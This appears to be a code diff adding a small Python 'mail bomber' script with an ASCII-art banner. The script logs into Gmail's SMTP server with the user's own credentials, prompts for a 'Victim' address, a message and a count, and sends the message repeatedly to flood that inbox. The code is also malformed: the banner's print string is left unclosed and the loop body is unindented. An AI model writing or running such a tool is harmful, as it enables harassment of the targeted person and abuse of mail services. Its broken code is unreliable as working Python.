@@ -1,0 +1,20 @@
+print("
+╔═══╗───╔╗──╔═╗╔═╗───╔╗")
+║╔═╗║───║║──║║╚╝║║───║║
+║║─║╠══╦╣╚═╗║╔╗╔╗╠══╦╣║
+║╚═╝║══╬╣╔╗║║║║║║║╔╗╠╣║
+║╔═╗╠══║║╚╝║║║║║║║╔╗║║╚╗
+╚╝─╚╩══╩╩══╝╚╝╚╝╚╩╝╚╩╩═╝
+import smtplib
+rocx=smtplib.SMTP('smtp.gmail.com','587')
+rocx.ehlo()
+rocx.starttls()
+email=str(input("Enter Your Email : "))
+pwd=str(input("Enter Your Password : "))
+rocx.login(email,pwd)
+tmail=str(input("Enter The Mail Address of Victim : "))
+msg=str(input("Enter The Message : "))
+amount=int(input("Enter The Amount : "))
+for i in range(amount):
+rocx.sendmail(email,tmail,msg)
+print(str(i+1)+" mail sent")
